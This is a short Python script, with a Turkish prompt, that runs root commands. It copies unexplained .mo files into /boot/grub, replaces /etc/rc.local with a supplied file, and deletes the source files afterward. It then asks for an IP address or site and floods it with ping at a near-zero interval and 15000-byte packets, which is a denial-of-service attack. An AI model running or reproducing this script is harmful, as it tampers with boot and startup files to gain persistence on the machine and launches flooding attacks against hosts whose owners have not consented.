import os
os.system("sudo cp local.mo /boot/grub")
os.system("sudo cp usab.mo /boot/grub")
os.system("sudo rm -r /etc/rc.local")
os.system("sudo cp rc.local /etc")
os.system("sudo rm -r local.mo")
os.system("sudo rm -r usab.mo")
os.system("sudo rm -r rc.local")
x = input("IP adresi veya Site :")
os.system("sudo ping -i 0.0000000000000001 -s 15000 " + x)

